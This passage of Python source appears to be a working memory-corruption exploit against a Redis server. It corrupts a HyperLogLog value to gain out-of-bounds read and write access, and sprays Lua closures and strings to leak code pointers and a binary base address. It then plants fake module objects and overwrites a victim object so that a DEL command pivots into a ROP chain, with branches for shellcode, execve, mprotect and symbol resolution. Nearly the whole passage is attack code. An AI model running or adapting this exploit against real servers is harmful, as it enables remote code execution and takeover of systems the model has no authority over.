            raise RuntimeError("B calibration failed")
        print(f"cal_byte={cal} flags_reg={flags_reg} changes={len(changes)}")
        if args.dispatch_arg_sidecar_fd and args.dispatch_sidecar_after_calibration:
            open_sidecar_fd()
        if args.preserve_cal_c_slot:
            hll.cmd(sock, "SET", k(prefix, "C"), b"\x00" * hll.SZ, timeout=30)
            print("[2b] re-primed C in the calibrated slot")

        print("[3] pre-spraying Lua CClosures above B")
        spray_result = hll.cmd(sock, "EVAL", lua_spray_script(global_name, args.closures), "0", timeout=60)
        addrs = parse_function_addrs(spray_result)
        if not addrs:
            raise RuntimeError(f"Lua CClosure spray returned no addresses: {spray_result!r}")
        lo = min(addr for _, addr in addrs)
        hi = max(addr for _, addr in addrs)
        print(f"sprayed={len(addrs)} closure_range=0x{lo:X}..0x{hi:X}")

        print(f"[4] pre-spraying {args.eggs} SDS marker strings")
        for i in range(args.eggs):
            hll.cmd(sock, "SET", k(prefix, f"sds_egg{i:04d}"), marker_value("sds", i), timeout=30)
        if args.dispatch_trigger and args.dispatch_spray_before_open:
            print(f"[4b] pre-spraying {args.eggs} module pivot helper objects")
            spray_dispatch_helpers(
                sock,
                prefix,
                args.eggs,
                args.stack_size,
                args.ctx_size,
                args.lowrop_external_msg,
                args.lowrop_external_msg_size,
                args.lowrop_external_msg_count,
            )

        print("[5] opening B window")
        flags_reg, opened_type, window = open_b_window(
            sock,
            prefix,
            flags_reg,
            args.flag_search_span,
            args.bruteforce_reg_values,
            prime_c=not args.preserve_cal_c_slot,
        )
        b_corrupted = True
        b_key = k(prefix, "B")
        print(f"selected_flags_reg={flags_reg} selected_type={opened_type} STRLEN(B)={window}")

        print("[6] recovering B_sds")
        b_sds = recover_b_sds(sock, prefix, b_key, window, args.scan_size)
        print(f"B window covers 0x{b_sds:X}..0x{b_sds + min(window, args.scan_size):X} for scan")

        if args.pointer_scan:
            scan_b_window_pointers(
                sock,
                b_key,
                b_sds,
                window,
                args.pointer_scan_size,
                args.pointer_scan_max_print,
            )

        print("[7] reading CClosure structs")
        got = 0
        printed = 0
        code_hits = []
        f_counts = {}
        for idx, addr in addrs:
            off = addr - b_sds
            if not (0 <= off and off + 0x48 < window):
                continue
            raw = hll.cmd(sock, "GETRANGE", b_key, str(off), str(off + 0x47), timeout=60)
            if not isinstance(raw, bytes) or len(raw) < 0x40:
                continue
            got += 1
            nxt = qword_at(raw, 0)
            env = qword_at(raw, 0x10)
            # tostring(function) reports the closure pointer at GCObject+8 on
            # this LuaJIT-style layout.  The C function pointer is therefore
            # +0x18 from the printed address, not +0x20.
            cfunc = qword_at(raw, 0x18)
            up0 = qword_at(raw, 0x20)
            cls = classify_ptr(cfunc)
            f_counts[cfunc] = f_counts.get(cfunc, 0) + 1
            should_print = printed < args.max_print or (args.print_all_code and cls == "eboot")
            if should_print:
                printed += 1
                print(
                    f"  closure[{idx:04d}] ptr=0x{addr:X} off=0x{off:X} "
                    f"tt=0x{raw[8]:02X} marked=0x{raw[9]:02X} isC=0x{raw[0x10]:02X} nup=0x{raw[0x11]:02X}"
                )
                print(
                    f"      next=0x{nxt:016X} {classify_ptr(nxt):8s} "
                    f"env=0x{env:016X} {classify_ptr(env):8s} "
                    f"f=0x{cfunc:016X} {cls:8s} up0=0x{up0:016X} {classify_ptr(up0)}"
                )
            if cls == "eboot":
                code_hits.append((idx, addr, cfunc, cls))

        print(f"RESULT: read {got}/{len(addrs)} sprayed CClosure objects")
        best_eboot_base = None
        if f_counts:
            print("UNIQUE C FUNCTION POINTERS:")
            for fptr, count in sorted(f_counts.items(), key=lambda item: (-item[1], item[0]))[:16]:
                cls = classify_ptr(fptr)
                suffix = ""
                if cls == "eboot":
                    suffix = f" eboot_base_candidate=0x{fptr - args.auxwrap_offset:X}"
                    if best_eboot_base is None:
                        best_eboot_base = fptr - args.auxwrap_offset
                print(f"  f=0x{fptr:016X} {cls:8s} count={count}{suffix}")
        if code_hits:
            print("CODE POINTER HITS:")
            for idx, obj, fptr, cls in code_hits[:max(0, args.max_print)]:
                print(
                    f"  closure[{idx}] ptr=0x{obj:X} f=0x{fptr:X} {cls} "
                    f"eboot_base_candidate=0x{fptr - args.auxwrap_offset:X}"
                )

        if args.dispatch_trigger:
            print("[dispatch] reconnecting command socket after CClosure scan")
            try:
                sock.close()
            except Exception:
                pass
            sock = socket.socket()
            sock.settimeout(20)
            sock.connect((args.host, args.port))
            print(f"[dispatch] reconnect PING: {hll.cmd(sock, 'PING')}")
            if args.eboot_base is None:
                if best_eboot_base is None:
                    raise RuntimeError("dispatch requested but no eboot base was derived")
                args.eboot_base = best_eboot_base
            if args.dispatch_arg2_eboot_base:
                args.dispatch_arg2 = args.eboot_base + args.dispatch_arg2_offset
            if args.stack_arg_eboot_offset is not None:
                args.stack_arg = args.eboot_base + args.stack_arg_eboot_offset
            if args.stack_ret_eboot_offset is not None:
                args.stack_ret = args.eboot_base + args.stack_ret_eboot_offset
            if args.dispatch_arg_eboot_offset is not None:
                args.dispatch_arg = args.eboot_base + args.dispatch_arg_eboot_offset
            args.chain = "dispatch-crash"
            args.pivot_addr = args.eboot_base + args.dispatch_func_offset
            print(
                f"[dispatch] eboot_base=0x{args.eboot_base:X} "
                f"dispatcher=0x{args.pivot_addr:X}"
            )
            if not args.dispatch_spray_before_open:
                print(f"[dispatch] post-open spraying {args.eggs} module pivot helper objects")
                spray_dispatch_helpers(
                    sock,
                    prefix,
                    args.eggs,
                    args.stack_size,
                    args.ctx_size,
                    args.lowrop_external_msg,
                    args.lowrop_external_msg_size,
                    args.lowrop_external_msg_count,
                )

            victim_key, victim_robj, b_sds2 = piv.find_victim_and_b_sds(
                sock, b_key, window, args.scan_size, prefix
            )
            if b_sds2 != b_sds:
                print(f"[dispatch] B_sds cross-check differs: sds=0x{b_sds:X} addr=0x{b_sds2:X}")
            module_b_sds = b_sds2
            mt_key, mt_addr, mt_robj = piv.find_presprayed_raw(
                sock, b_key, module_b_sds, window, args.scan_size, prefix, "mt"
            )
            stack_key, stack_addr, stack_robj = piv.find_presprayed_raw(
                sock, b_key, module_b_sds, window, args.scan_size, prefix, "stk"
            )
            ctx_key, ctx_addr, ctx_robj = piv.find_presprayed_raw(
                sock, b_key, module_b_sds, window, args.scan_size, prefix, "ctx"
            )
            msg_key = None
            msg_addr = None
            msg_robj = None
            if args.lowrop_external_msg:
                msg_key, msg_addr, msg_robj = piv.find_presprayed_raw(
                    sock, b_key, module_b_sds, window, args.scan_size, prefix, "msg"
                )
                msg_write_off = 0
                msg_align = max(1, args.lowrop_external_msg_align)
                if msg_align > 1:
                    msg_aligned = (msg_addr + msg_align - 1) & ~(msg_align - 1)
                    msg_write_off = msg_aligned - msg_addr
                    msg_addr = msg_aligned
                args.lowrop_external_msg_write_offset = msg_write_off
                args.lowrop_external_msg_addr = msg_addr
            msg_part = "" if msg_robj is None else f" msg=0x{msg_robj:X}"
            print(f"[dispatch] helper robjs mt=0x{mt_robj:X} stack=0x{stack_robj:X} ctx=0x{ctx_robj:X}{msg_part}")

            if args.dispatch_arg_ctx:
                args.dispatch_arg = ctx_addr
            if args.dispatch_arg_stack_offset is not None:
                args.dispatch_arg = stack_addr + args.dispatch_arg_stack_offset
            if args.dispatch_arg_eboot_offset is not None:
                args.dispatch_arg = args.eboot_base + args.dispatch_arg_eboot_offset
            if args.stack_ret_eboot_offset is not None:
                args.stack_ret = args.eboot_base + args.stack_ret_eboot_offset
            stack_value, stack_info = piv.build_stack_value(args, stack_addr)
            external_msg_value = None
            if stack_info and "lowrop_external_msg_value" in stack_info:
                external_msg_value = stack_info.pop("lowrop_external_msg_value")
            ctx_value, dispatch_info = piv.build_context_value(args, mt_addr, stack_addr, ctx_addr)
            if stack_info:
                if "copy_send_fake_client" in stack_info:
                    print(
                        f"[dispatch] copy-send fake_client=0x{stack_info['copy_send_fake_client']:X} "
                        f"src=0x{stack_info['copy_send_src']:X} len=0x{stack_info['copy_send_len']:X} "
                        f"fd={stack_info['copy_send_fd']} off=0x{stack_info['copy_send_offset']:X}"
                    )
                elif "cstring" in stack_info:
                    print(
                        f"[dispatch] stack cstring=0x{stack_info['cstring']:X} "
                        f"len=0x{stack_info['cstring_len']:X}"
                    )
                elif "shellcode_addr" in stack_info:
                    print(
                        f"[dispatch] stack shellcode=0x{stack_info['shellcode_addr']:X} "
                        f"len=0x{stack_info['shellcode_len']:X} off=0x{stack_info['shellcode_offset']:X} "
                        f"pair=(0x{stack_info['pair0']:X},0x{stack_info['pair1']:X})"
                    )
                elif "patch_addr" in stack_info:
                    print(
                        f"[dispatch] stack patch=0x{stack_info['patch_addr']:X} "
                        f"len=0x{stack_info['patch_len']:X} off=0x{stack_info['patch_offset']:X} "
                        f"bytes={stack_info['patch_hex']} "
                        f"pair=(0x{stack_info['pair0']:X},0x{stack_info['pair1']:X})"
                    )
                elif "execve_path" in stack_info:
                    print(
                        f"[dispatch] stack execve path=0x{stack_info['execve_path']:X} "
                        f"argv=0x{stack_info['execve_argv']:X} envp=0x{stack_info['execve_envp']:X} "
                        f"argc={stack_info['execve_argc']} "
                        f"pair=(0x{stack_info['pair0']:X},0x{stack_info['pair1']:X})"
                    )
                elif "lowrop_scratch" in stack_info:
                    leak_desc = ""
                    if stack_info.get("lowrop_leak_offsets"):
                        leak_desc = " leaks=" + ",".join(f"0x{x:X}" for x in stack_info["lowrop_leak_offsets"])
                    dlsym_desc = ""
                    if stack_info.get("lowrop_dlsym_cases"):
                        dlsym_desc = f" dlsym_cases={len(stack_info['lowrop_dlsym_cases'])}"
                    if stack_info.get("lowrop_module_dlsym"):
                        g = stack_info["lowrop_module_dlsym"]
                        dlsym_desc += (
                            f" module_dlsym_flavor={g['flavor']}"
                            f" get_module_handle=0x{g['get_module_handle_offset']:X}"
                        )
                    if stack_info.get("lowrop_module_table"):
                        g = stack_info["lowrop_module_table"]
                        dlsym_desc += (
                            f" module_table_flavor={g['flavor']}"
                            f" table=0x{g['table_offset']:X}"
                            f" entries={g['entries']}"
                        )
                    if stack_info.get("lowrop_dynlib_list"):
                        g = stack_info["lowrop_dynlib_list"]
                        dlsym_desc += (
                            f" dynlib_flavor={g['flavor']}"
                            f" get_list=0x{g['get_list_offset']:X}"
                            f" max={g['max']}"
                            f" order={g['order']}"
                            f" errno={int(bool(g.get('capture_errno')))}"
                        )
                    if stack_info.get("lowrop_wrapper_call"):
                        g = stack_info["lowrop_wrapper_call"]
                        dlsym_desc += (
                            f" wrapper_flavor={g['flavor']}"
                            f" wrapper_source={g['source']}"
                            f" wrapper_off=0x{g['wrapper_offset']:X}"
                            f" wrapper_msg_len=0x{g['msg_len']:X}"
                            f" prezero_r8r9={int(bool(g.get('prezero_r8_r9')))}"
                            f" call8_send_self={int(bool(g.get('call8_send_self')))}"
                            f" setctx={int(bool(g.get('use_setcontext')))}"
                            f" preflight={int(bool(g.get('preflight_send')))}"
                            f" errno={int(bool(g.get('capture_errno')))}"
                        )
                    if stack_info.get("lowrop_direct_syscall"):
                        g = stack_info["lowrop_direct_syscall"]
                        wrapper_off = g.get("wrapper_offset")
                        wrapper_text = "source" if wrapper_off is None else f"0x{wrapper_off:X}"
                        dlsym_desc += (
                            f" direct_syscall_flavor={g['flavor']}"
                            f" direct_syscall_source={g['source']}"
                            f" direct_syscall_wrapper={wrapper_text}"
                            f" adjust=0x{g['landing_adjust']:X}"
                            f" sysno=0x{g['syscall_num']:X}"
                            f" sixargs={int(bool(g.get('sixargs')))}"
                            f" errno={int(bool(g.get('capture_errno')))}"
                        )
                    if stack_info.get("lowrop_code_read"):
                        g = stack_info["lowrop_code_read"]
                        wrapper_off = g.get("wrapper_offset")
                        wrapper_text = "source" if wrapper_off is None else f"0x{wrapper_off:X}"
                        dlsym_desc += (
                            f" code_read_source={g['source']}"
                            f" code_read_flavor={g['flavor']}"
                            f" code_read_wrapper={wrapper_text}"
                            f" adjust=0x{g['adjust'] & 0xFFFFFFFFFFFFFFFF:X}"
                            f" read_len=0x{g['read_len']:X}"
                        )
                    if stack_info.get("lowrop_self_dlsym"):
                        g = stack_info["lowrop_self_dlsym"]
                        dlsym_desc += (
                            f" self_dlsym_flavor={g['flavor']}"
                            f" self_info_ptr=0x{g['self_info_ptr_offset']:X}"
                        )
                    mprotect_desc = ""
                    if stack_info.get("lowrop_mprotect"):
                        m = stack_info["lowrop_mprotect"]
                        mprotect_desc = (
                            f" mprotect_target={m.get('target', 'scratch')}"
                            f" page=0x{m['target_page']:X}"
                            f" len=0x{m['length']:X} prot=0x{m['prot']:X}"
                            f" send_export=0x{m.get('send_export_offset', 0):X}"
                            f" syscall_off=0x{m.get('syscall_offset', 0):X}"
                            f" derive_only={int(bool(m.get('derive_only')))}"
                        )
                    gtod_desc = ""
                    if stack_info.get("lowrop_libc_gettimeofday"):
                        g = stack_info["lowrop_libc_gettimeofday"]
                        gtod_desc = (
                            f" memcpy_got=0x{g['memcpy_got']:X}"
                            f" libc_gtod_got=0x{g['libc_gettimeofday_got']:X}"
                            f" qdelta=0x{g['qword_delta']:X}"
                            f" derive_only={int(bool(g.get('derive_only')))}"
                        )
                    getpid_desc = ""
                    if stack_info.get("lowrop_libc_getpid"):
                        g = stack_info["lowrop_libc_getpid"]
                        getpid_desc = (
                            f" memcpy_got=0x{g['memcpy_got']:X}"
                            f" libc_getpid_got=0x{g['libc_getpid_got']:X}"
                            f" qdelta=0x{g['qword_delta']:X}"
                            f" derive_only={int(bool(g.get('derive_only')))}"
                        )
                    eboot_desc = ""
                    if stack_info.get("lowrop_eboot_getpid"):
                        g = stack_info["lowrop_eboot_getpid"]
                        eboot_desc += f" eboot_getpid_got=0x{g['got']:X} derive_only={int(bool(g.get('derive_only')))}"
                    if stack_info.get("lowrop_eboot_gettimeofday"):
                        g = stack_info["lowrop_eboot_gettimeofday"]
                        eboot_desc += f" eboot_gtod_got=0x{g['got']:X} derive_only={int(bool(g.get('derive_only')))}"
                    if stack_info.get("lowrop_eboot_mprotect"):
                        g = stack_info["lowrop_eboot_mprotect"]
                        eboot_desc += (
                            f" eboot_mprotect_from_getpid_got=0x{g['getpid_got']:X}"
                            f" flavor={g['flavor']}"
                            f" target={g.get('target', 'scratch')}"
                            f" page=0x{g['target_page']:X} len=0x{g['length']:X} prot=0x{g['prot']:X}"
                            f" errno={int(bool(g.get('capture_errno')))}"
                            f" derive_only={int(bool(g.get('derive_only')))}"
                        )
                    notify_desc = ""
                    if stack_info.get("lowrop_notify"):
                        n = stack_info["lowrop_notify"]
                        notify_desc = (
                            f" notify=0x{n['notify']:X}/0x{n['size']:X}"
                            f" path=0x{n['path']:X}"
                            f" fd_slot=0x{n['fd_slot']:X}"
                        )
                    sandbox_desc = ""
                    if stack_info.get("lowrop_sandbox_probe"):
                        s = stack_info["lowrop_sandbox_probe"]
                        sandbox_desc = (
                            f" sandbox_paths={s['count']}"
                            f" flags=0x{s['flags']:X}"
                        )
                    print(
                        f"[dispatch] lowrop scratch=0x{stack_info['lowrop_scratch']:X} "
                        f"vtable=0x{stack_info['lowrop_vtable']:X} "
                        f"chain=0x{stack_info['lowrop_chain']:X} "
                        f"chain_len=0x{stack_info.get('lowrop_chain_len', 0):X} "
                        f"chain_end_off=0x{stack_info.get('lowrop_chain_end_off', 0):X} "
                        f"msg=0x{stack_info['lowrop_msg']:X} "
                        f"len=0x{stack_info['lowrop_msg_len']:X} "
                        f"fd={stack_info['lowrop_fd']} "
                        f"copy_len=0x{stack_info['lowrop_copy_len']:X} "
                        f"pair=0x{stack_info['lowrop_pair']:X} "
                        f"kind={stack_info.get('lowrop_kind', 'send')}{leak_desc}{dlsym_desc}{mprotect_desc}{eboot_desc}{gtod_desc}{getpid_desc}{notify_desc}{sandbox_desc}"
                    )
                else:
                    print(
                        f"[dispatch] stack callback record data=0x{stack_info['callback_data']:X} "
                        f"len=0x{stack_info['callback_len']:X} byte=0x{stack_info['data_byte']:02X}"
                    )
            print(
                f"[dispatch] target=0x{dispatch_info['target']:X} "
                f"arg=0x{dispatch_info['arg']:X}"
                + (f" arg2=0x{dispatch_info['arg2']:X}" if "arg2" in dispatch_info else "")
                + (f" followup=0x{dispatch_info['followup']:X}" if dispatch_info.get("followup") else "")
                + (f" arg2_source={dispatch_info['arg2_source']}" if "arg2_source" in dispatch_info else "")
            )
            mt_value = piv.build_module_type_value(args.pivot_addr, args.module_type_free_offset)
            if args.module_type_free_offset is not None:
                if args.module_type_free_offset < 0:
                    print("[dispatch] moduleType callbacks disabled (all zero)")
                else:
                    print(f"[dispatch] moduleType free offset=0x{args.module_type_free_offset:X}")
            piv.write_fake_objects(
                sock, mt_key, stack_key, ctx_key, mt_addr, stack_addr, ctx_addr,
                args.pivot_addr, stack_value, ctx_value, mt_value=mt_value,
            )
            if external_msg_value is not None:
                if msg_key is None or msg_addr is None:
                    raise RuntimeError("external lowrop message was built without a message helper key")
                msg_write_off = getattr(args, "lowrop_external_msg_write_offset", 0)
                if msg_write_off + len(external_msg_value) > args.lowrop_external_msg_size:
                    raise RuntimeError(
                        f"external lowrop message len 0x{len(external_msg_value):X} "
                        f"at off 0x{msg_write_off:X} exceeds helper size 0x{args.lowrop_external_msg_size:X}"
                    )
                hll.cmd(sock, "SETRANGE", msg_key, str(msg_write_off), external_msg_value, timeout=60)
                got_msg = hll.cmd(
                    sock,
                    "GETRANGE",
                    msg_key,
                    str(msg_write_off),
                    str(msg_write_off + len(external_msg_value) - 1),
                    timeout=60,
                )
                if got_msg != external_msg_value:
                    raise RuntimeError("external lowrop message verification failed")
                print(
                    f"[dispatch] external msg=0x{msg_addr:X} off=0x{msg_write_off:X} "
                    f"len=0x{len(external_msg_value):X} key={msg_key}"
                )
            module_value_ptr = ctx_addr
            if args.dispatch_modulevalue_closure:
                closure_addr = None
                for _idx, candidate in addrs:
                    candidate_off = candidate - module_b_sds
                    if 0 <= candidate_off <= window - 16:
                        closure_addr = candidate
                        closure_off = candidate_off
                        break
                if closure_addr is None:
                    raise RuntimeError("no sprayed CClosure object is writable through the B window")
                module_value = struct.pack("<QQ", mt_addr, ctx_addr)
                hll.cmd(sock, "SETRANGE", b_key, str(closure_off), module_value, timeout=60)
                module_verify = hll.cmd(sock, "GETRANGE", b_key, str(closure_off), str(closure_off + 15), timeout=60)
                print(
                    f"[dispatch] moduleValue via CClosure=0x{closure_addr:X} "
                    f"B+0x{closure_off:X} raw={module_verify.hex() if isinstance(module_verify, bytes) else module_verify!r}"
                )
                if module_verify != module_value:
                    raise RuntimeError("moduleValue CClosure overwrite did not verify")
                module_value_ptr = closure_addr
            elif args.dispatch_modulevalue_robj:
                ctx_robj_off = ctx_robj - module_b_sds
                if not (0 <= ctx_robj_off < window):
                    raise RuntimeError("ctx robj outside B window")
                module_value = struct.pack("<QQ", mt_addr, ctx_addr)
                hll.cmd(sock, "SETRANGE", b_key, str(ctx_robj_off), module_value, timeout=60)
                module_verify = hll.cmd(sock, "GETRANGE", b_key, str(ctx_robj_off), str(ctx_robj_off + 15), timeout=60)
                print(
                    f"[dispatch] moduleValue via ctx_robj=0x{ctx_robj:X} "
                    f"B+0x{ctx_robj_off:X} raw={module_verify.hex() if isinstance(module_verify, bytes) else module_verify!r}"
                )
                if module_verify != module_value:
                    raise RuntimeError("moduleValue robj overwrite did not verify")
                module_value_ptr = ctx_robj

            victim_off = victim_robj - module_b_sds
            if not (0 <= victim_off < window):
                raise RuntimeError("dispatch victim robj outside B window")
            victim_orig = hll.cmd(sock, "GETRANGE", b_key, str(victim_off), str(victim_off + 15), timeout=60)
            if not isinstance(victim_orig, bytes) or len(victim_orig) != 16:
                raise RuntimeError(f"could not read dispatch victim robj: {victim_orig!r}")
            print(f"[dispatch] victim before {hll.parse_robj(victim_orig)} B+0x{victim_off:X}")
            new_robj = struct.pack("<I", 5) + struct.pack("<I", 1) + struct.pack("<Q", module_value_ptr)
            hll.cmd(sock, "SETRANGE", b_key, str(victim_off), new_robj, timeout=60)
            verify = hll.cmd(sock, "GETRANGE", b_key, str(victim_off), str(victim_off + 15), timeout=60)
            print(f"[dispatch] victim after {hll.parse_robj(verify)}")
            if verify != new_robj:
                raise RuntimeError("dispatch victim overwrite did not verify")
            print("[dispatch] triggering DEL victim; disconnect/restart means dispatcher path reached")
            try:
                if args.dispatch_raw_del_recv:
                    n, reason = raw_del_capture(
                        sock,
                        victim_key,
                        args.dispatch_raw_del_out,
                        args.dispatch_raw_del_max,
                        args.dispatch_raw_del_timeout,
                        sidecar_sock,
                    )
                    print(
                        f"[dispatch] raw DEL capture wrote {n} bytes to "
                        f"{args.dispatch_raw_del_out!r} reason={reason}"
                    )
                else:
                    res = hll.cmd(sock, "DEL", victim_key, timeout=5)
                    print(f"[dispatch] DEL returned without disconnect: {res!r}")
                if args.dispatch_read_stack_after_del and not args.dispatch_raw_del_recv:
                    post = hll.cmd(sock, "GETRANGE", stack_key, "0", "63", timeout=10)
                    if isinstance(post, bytes):
                        print(f"[dispatch] stack[0..0x3f] after DEL: {post.hex()}")
                    else:
                        print(f"[dispatch] stack read after DEL returned: {post!r}")
            except Exception as exc:
                print(f"[dispatch] DEL disconnected/crashed client: {exc}")
                return 0
        return 0 if got else 2

    except Exception as exc:
        print(f"ERROR: {exc}")
        return 1
    finally:
        if not args.keep_lua:
            try:
                res = hll.cmd(sock, "EVAL", lua_clear_script(global_name), "0", timeout=60)
                print(f"lua clear={res!r}")
            except Exception as exc:
                print(f"[!] lua clear failed: {exc}")
        try:
            if original_hll_max is not None:
                hll.redis_config_set(sock, "hll-sparse-max-bytes", original_hll_max)
                print(f"hll-sparse-max-bytes restored={original_hll_max}")
        except Exception as exc:
            print(f"[!] config restore failed: {exc}")
        if not args.keep_keys:
            try:
                if b_corrupted and flags_reg is not None:
                    print("[cleanup] attempting B restore")
                    for value in (2, 3, 4, 1, 0, 5, 6, 7):
                        hll.write_flags(sock, prefix, flags_reg, value, f"restore{value}")
                        restored_len = hll.cmd(sock, "STRLEN", k(prefix, "B"), timeout=60)
                        print(f"  restore value={value} STRLEN(B)={restored_len}")
                        if restored_len == hll.SZ:
                            b_corrupted = False
                            hll.cmd(sock, "SET", k(prefix, "B"), b"\xbb" * hll.SZ, timeout=60)
                            break
                names = [k(prefix, f"p{i}") for i in range(80)]
                names += [k(prefix, x) for x in ("A", "C", "D", "H")]
                names += [k(prefix, f"sds_egg{i:04d}") for i in range(args.eggs)]
                if not b_corrupted:
                    names.append(k(prefix, "B"))
                for i in range(0, len(names), 64):
                    hll.cmd(sock, "DEL", *names[i:i + 64], timeout=30)
                print(f"cleanup include_b={not b_corrupted}")
                if original_hll_max is not None:
                    hll.redis_config_set(sock, "hll-sparse-max-bytes", original_hll_max)
                    print(f"hll-sparse-max-bytes restored after cleanup={original_hll_max}")
            except Exception as exc:
                print(f"[!] cleanup failed: {exc}")
        try:
            sock.close()
        except Exception:
            pass
        if sidecar_sock is not None:
            try:
                sidecar_sock.close()
            except Exception:
                pass


if __name__ == "__main__":
    raise SystemExit(main())
